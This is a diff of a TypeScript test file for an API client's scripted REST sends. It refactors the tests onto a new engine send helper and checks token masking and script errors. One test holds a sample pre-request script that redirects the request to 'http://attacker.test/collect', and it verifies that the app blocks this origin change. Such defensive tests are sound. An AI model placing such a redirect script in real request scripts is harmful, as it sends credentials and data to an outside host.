@@ -26,13 +26,15 @@ import {
 import type { PropertyMap, Project, RequestScripts, RestRequestDef } from '@wirebench/engine';
 import { EngineService } from '../src/main/engine-service.js';
 import { HistoryService } from '../src/main/history-service.js';
-import { sendRestRequest, type RequestChannelDeps } from '../src/main/ipc/request.js';
+import type { RequestChannelDeps } from '../src/main/ipc/request.js';
 import { resolveRestSend } from '../src/main/rest-send.js';
 import { ScriptHost } from '../src/main/script-host.js';
 import { sendAndRecordHistory } from '../src/main/send-with-history.js';
 import { SequenceRunner } from '../src/main/sequence-runner.js';
+import { sendThroughEngine } from '../src/main/send/exchange.js';
+import { sendDepsFor } from './helpers/send-deps.js';
 import type { WebContents } from 'electron';
-import type { HistoryEntryWire } from '../src/shared/wire-types.js';
+import type { HistoryEntryWire, RestExchangeSummary } from '../src/shared/wire-types.js';
 
 vi.mock('electron', () => ({ ipcMain: { handle: () => undefined } }));
 
@@ -86,6 +88,8 @@ interface Harness {
   readonly deps: RequestChannelDeps;
   readonly engine: EngineService;
   readonly history: HistoryEntryWire[];
+  /** A single REST send of `requestId`, through the engine, with the same project and History. */
+  readonly sendRest: (sendId: string, requestId: string) => Promise<RestExchangeSummary>;
 }
 
 async function harness(model: Project): Promise<Harness> {
@@ -121,7 +125,21 @@ async function harness(model: Project): Promise<Harness> {
     secretsFor: () => (ref) => Promise.resolve(ref === 'secret:api_key' ? API_KEY : undefined),
     scripts: host,
   };
-  return { deps, engine, history: appended };
+  // The project's own `region` property, which the channels' stub hands over as `scopesFor`.
+  const restDeps = sendDepsFor(
+    { ...model, properties: { ...model.properties, region: 'eu' } },
+    {
+      history,
+      onHistoryAppended: (wire) => appended.push(wire),
+      // The send's project's secrets: its token, and the credentials its auth names.
+      secretsFor: () => (ref) =>
+        Promise.resolve(ref === 'secret:api_key' ? API_KEY : ref === 'sec_token' ? TOKEN : undefined),
+      scripts: host,
+    },
+  );
+  const sendRest = (sendId: string, requestId: string): Promise<RestExchangeSummary> =>
+    sendThroughEngine(restDeps, sendId, requestId, { draft: { kind: 'rest' } });
+  return { deps, engine, history: appended, sendRest };
 }
 
 const echoed = (text: string): { headers: Record<string, string>; query: Record<string, string> } =>
@@ -140,9 +158,9 @@ describe('a REST send with scripts', () => {
         post: "test('echoed', () => expect(response.status).toBe(200));",
       }),
     };
-    const { deps, engine } = await harness(project([request]));
+    const { sendRest } = await harness(project([request]));
 
-    const summary = await sendRestRequest(engine, deps, { sendId: 's1', requestId: 'r1' });
+    const summary = await sendRest('s1', 'r1');
 
     const seen = echoed(summary.text);
     expect(seen.headers['x-region']).toBe('eu');
@@ -173,9 +191,9 @@ describe('a REST send with scripts', () => {
         url: '/echo',
         headers: [entry('x-session', '${#Sequence#token}'), entry('x-plain', '${#Sequence#plain}')],
       });
-      const { deps, engine, history } = await harness(project([login, next]));
+      const { sendRest, history } = await harness(project([login, next]));
 
-      const first = await sendRestRequest(engine, deps, { sendId: 's1', requestId: 'r1' });
+      const first = await sendRest('s1', 'r1');
       expect(first.script?.log.join('\n')).not.toContain(LOGIN_TOKEN);
       expect(JSON.stringify(history[0])).not.toContain(LOGIN_TOKEN);
       expect(host.sessionValues('p1')).toEqual({ token: LOGIN_TOKEN, plain: 'visible' });
@@ -184,7 +202,7 @@ describe('a REST send with scripts', () => {
         { name: 'plain', value: 'visible', secret: false },
       ]);
 
-      const second = await sendRestRequest(engine, deps, { sendId: 's2', requestId: 'r2' });
+      const second = await sendRest('s2', 'r2');
       // The server got the token; the request as the summary and History show it has it masked.
       expect(echoed(second.text).headers['x-session']).toBe(LOGIN_TOKEN);
       expect(echoed(second.text).headers['x-plain']).toBe('visible');
@@ -205,9 +223,9 @@ describe('a REST send with scripts', () => {
         ...createRestRequest('Echo', { id: 'r1', url: '/echo' }),
         scripts: scripts({ pre: "request.url = 'http://attacker.test/collect';" }),
       };
-      const { deps, engine, history } = await harness(project([request]));
+      const { sendRest, history } = await harness(project([request]));
 
-      await expect(sendRestRequest(engine, deps, { sendId: 's1', requestId: 'r1' })).rejects.toMatchObject({
+      await expect(sendRest('s1', 'r1')).rejects.toMatchObject({
         code: 'script-origin-change',
       });
       expect(history).toEqual([]);
@@ -219,9 +237,9 @@ describe('a REST send with scripts', () => {
       ...createRestRequest('Echo', { id: 'r1', url: '/echo' }),
       scripts: scripts({ post: 'log(response.statuss);' }),
     };
-    const { deps, engine } = await harness(project([request]));
+    const { sendRest } = await harness(project([request]));
 
-    const error = await sendRestRequest(engine, deps, { sendId: 's1', requestId: 'r1' }).then(
+    const error = await sendRest('s1', 'r1').then(
       () => undefined,
       (thrown: unknown) => thrown as { code: string; message: string },
     );
@@ -234,9 +252,9 @@ describe('a REST send with scripts', () => {
       ...createRestRequest('Echo', { id: 'r1', url: '/echo' }),
       scripts: scripts({ pre: "request.headers.set('x-ran', 'yes');", enabled: false }),
     };
-    const { deps, engine } = await harness(project([request]));
+    const { sendRest } = await harness(project([request]));
 
-    const summary = await sendRestRequest(engine, deps, { sendId: 's1', requestId: 'r1' });
+    const summary = await sendRest('s1', 'r1');
     expect(echoed(summary.text).headers['x-ran']).toBeUndefined();
     expect(summary.scriptsOff).toBe(true);
     expect(summary.script).toBeUndefined();
